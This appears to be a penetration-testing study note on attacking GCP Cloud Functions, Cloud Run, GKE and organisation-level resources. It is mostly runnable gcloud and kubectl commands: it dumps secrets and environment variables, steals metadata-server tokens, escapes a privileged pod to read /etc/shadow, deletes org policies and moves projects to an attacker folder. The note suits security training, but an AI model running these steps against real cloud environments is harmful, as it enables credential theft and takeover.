# 03.4 — GCP Cloud Functions, Cloud Run, GKE, and Org-Level Attacks

## What This Note Covers

Serverless and container attack surfaces in GCP — Cloud Functions, Cloud Run, GKE — and organisation-level attacks including project enumeration across the org, org policy bypass, and resource manager abuse.

---

## Cloud Functions Attacks

Cloud Functions are serverless, event-driven functions. Each function has a service account (the execution identity). The key attack surface:

### Unauthenticated Invocation

Cloud Functions can be configured to allow unauthenticated HTTP requests. When combined with a high-privilege execution SA, this is a critical finding.

```bash
# List all Cloud Functions in the project
gcloud functions list --project PROJECT_ID

# Get details on a specific function
gcloud functions describe FUNCTION_NAME \
  --region REGION \
  --project PROJECT_ID

# Check if unauthenticated invocation is allowed
# Look for: "httpsTrigger.securityLevel": "SECURE_OPTIONAL"
# or the IAM policy:
gcloud functions get-iam-policy FUNCTION_NAME \
  --region REGION \
  --project PROJECT_ID
# If "allUsers" has "roles/cloudfunctions.invoker" → unauthenticated access allowed

# Invoke an unauthenticated function
FUNCTION_URL=$(gcloud functions describe FUNCTION_NAME \
  --region REGION --format="get(httpsTrigger.url)")
curl $FUNCTION_URL
curl -X POST $FUNCTION_URL -H "Content-Type: application/json" -d '{"test": "payload"}'
```

### Environment Variable Exposure

```bash
# Get environment variables of a function (requires cloudfunctions.functions.get)
gcloud functions describe FUNCTION_NAME \
  --region REGION \
  --project PROJECT_ID \
  --format="get(environmentVariables)"

# Or get the full configuration
gcloud functions describe FUNCTION_NAME \
  --region REGION \
  --project PROJECT_ID \
  --format=json | python3 -m json.tool | grep -A2 "environment"
```

### Function Source Code Download

```bash
# Get download URL for function source
gcloud functions describe FUNCTION_NAME \
  --region REGION \
  --project PROJECT_ID \
  --format="get(sourceArchiveUrl)"

# Download and inspect the code
# sourceArchiveUrl is a GCS path — fetch with gsutil
gsutil cp gs://BUCKET/path/to/function.zip /tmp/
unzip /tmp/function.zip -d /tmp/function-code/
grep -r "password\|secret\|key\|token" /tmp/function-code/
```

### Execution Role Abuse

```bash
# Get the service account the function runs as
gcloud functions describe FUNCTION_NAME \
  --region REGION \
  --format="get(serviceAccountEmail)"

# Check what that SA can do
SA_EMAIL=$(gcloud functions describe FUNCTION_NAME \
  --region REGION --format="get(serviceAccountEmail)")

gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:$SA_EMAIL" \
  --format="table(bindings.role)"

# If the SA has powerful roles → create a malicious function with that SA
# (requires cloudfunctions.functions.create + iam.serviceAccounts.actAs on that SA)
```

## Cloud Run Attacks

Cloud Run runs containerised workloads. Similar attack surface to Cloud Functions but with containers.

```bash
# List Cloud Run services
gcloud run services list --project PROJECT_ID --platform managed

# Describe a service
gcloud run services describe SERVICE_NAME \
  --platform managed \
  --region REGION \
  --project PROJECT_ID

# Check if unauthenticated invocation allowed
gcloud run services get-iam-policy SERVICE_NAME \
  --platform managed \
  --region REGION \
  --project PROJECT_ID
# allUsers with roles/run.invoker → public

# Get environment variables
gcloud run services describe SERVICE_NAME \
  --platform managed --region REGION \
  --format="get(spec.template.spec.containers[0].env)"

# Get the service account
gcloud run services describe SERVICE_NAME \
  --platform managed --region REGION \
  --format="get(spec.template.spec.serviceAccountName)"
```

## GKE (Kubernetes on GCP) Attacks

GKE is Google's managed Kubernetes service. Two distinct attack surfaces: the Kubernetes layer and the GCP layer (node SA, workload identity).

### Initial Access and Enumeration

```bash
# List GKE clusters
gcloud container clusters list --project PROJECT_ID

# Get credentials for a cluster (writes to ~/.kube/config)
gcloud container clusters get-credentials CLUSTER_NAME \
  --zone ZONE \
  --project PROJECT_ID

# Verify access
kubectl get nodes
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl auth can-i --list  # list what you can do in the cluster
```

### Kubernetes RBAC Misconfigurations

```bash
# Check cluster role bindings — find over-privileged subjects
kubectl get clusterrolebindings -o wide

# Find bindings that grant cluster-admin
kubectl get clusterrolebindings \
  -o jsonpath='{range .items[?(@.roleRef.name=="cluster-admin")]}{.subjects}{"\n"}{end}'

# Check your own permissions
kubectl auth can-i create pods
kubectl auth can-i exec pods
kubectl auth can-i get secrets

# List all secrets (if permitted)
kubectl get secrets --all-namespaces
kubectl get secret SECRET_NAME -n NAMESPACE -o yaml
# Secrets are base64 encoded (not encrypted)
echo "BASE64_VALUE" | base64 --decode
```

### Workload Identity Abuse

Workload Identity is GKE's recommended way to give pods a GCP identity. A Kubernetes service account (KSA) is linked to a GCP service account (GSA). Misconfigured WI bindings allow unintended pods to access GCP services.

```bash
# Check which KSAs have workload identity annotations
kubectl get serviceaccounts --all-namespaces -o yaml | grep iam.gke.io/gcp-service-account

# The annotation links KSA to GSA:
# iam.gke.io/gcp-service-account: SA_EMAIL

# Check if the GSA allows the KSA to impersonate it
gcloud iam service-accounts get-iam-policy GSA_EMAIL --project PROJECT_ID
# Look for: serviceAccount:PROJECT.svc.id.goog[NAMESPACE/KSA_NAME] with roles/iam.workloadIdentityUser

# From inside a pod with workload identity:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Returns the GSA's token
```

### Pod Escape to Node

If you can execute commands in a pod (via kubectl exec or a webshell):

```bash
# Check if the pod is privileged
kubectl describe pod POD_NAME -n NAMESPACE | grep -i privileged

# Privileged pod → access the host node's filesystem
# Mount host filesystem
kubectl run privesc --image=alpine --overrides='
{
  "spec": {
    "containers": [{
      "name": "privesc",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "sleep 3600"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "host", "mountPath": "/host"}]
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
  }
}' -it --restart=Never

# Inside the pod — access node filesystem
ls /host/etc/
cat /host/etc/shadow
# Steal node SA credentials from node's metadata
chroot /host curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Org-Level Attacks

If your compromised identity has org-level permissions, or you've escalated to a role with org access, you can attack across the entire organisation.

### Project Enumeration Across the Org

```bash
# List ALL projects in the organisation
gcloud projects list --filter="parent.id=ORG_ID AND parent.type=organization"

# Or list via resource manager API
gcloud resource-manager folders list --organization ORG_ID
gcloud projects list  # if you have org-level reader, this shows all projects

# Get IAM policy of every project
for PROJECT in $(gcloud projects list --format="value(projectId)"); do
  echo "=== Project: $PROJECT ==="
  gcloud projects get-iam-policy $PROJECT --format="table(bindings.role, bindings.members)" 2>/dev/null
done
```

### Org Policy Bypass

Org policies restrict what can happen in projects. Removing or modifying them unlocks capabilities.

```bash
# List org policies on the organisation
gcloud resource-manager org-policies list --organization ORG_ID

# Delete a restrictive policy (requires orgpolicy.policies.create or setOrgPolicy)
# Example: remove the policy blocking SA key creation
gcloud resource-manager org-policies delete \
  iam.disableServiceAccountKeyCreation \
  --organization ORG_ID

# Now create SA keys in projects that were previously restricted
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account ADMIN_SA@PROJECT.iam.gserviceaccount.com
```

### Resource Manager Abuse

The Resource Manager API controls the hierarchy. With write permissions at the org level:

```bash
# Move a project under a different folder (change its inherited policies)
gcloud projects move PROJECT_ID \
  --folder ATTACKER_CONTROLLED_FOLDER_ID

# The project now inherits policies from attacker's folder
# If attacker's folder grants the attacker roles/owner → project is compromised
```

## Domain-Wide Delegation — Recap and Detection

DWD is covered in [[03.2 — GCP Service Account Attacks]] but detection deserves its own note here:

```bash
# Find SAs with DWD enabled via the Admin SDK
# (requires Google Workspace admin credentials or Google Admin API access)

# In GCP console: each SA has a "Domain-wide delegation" section
# Via API: check if "oauth2ClientId" is present on the SA

# List delegated authorities in Google Workspace Admin:
# Admin Console → Security → API Controls → Domain-wide delegation
# This shows all SAs + their OAuth scopes

# High-risk scope combinations:
# https://www.googleapis.com/auth/gmail.readonly → read all email
# https://www.googleapis.com/auth/drive → full Drive access for all users
# https://www.googleapis.com/auth/admin.directory.user → manage all GWS users
# https://mail.google.com/ → full Gmail access
```
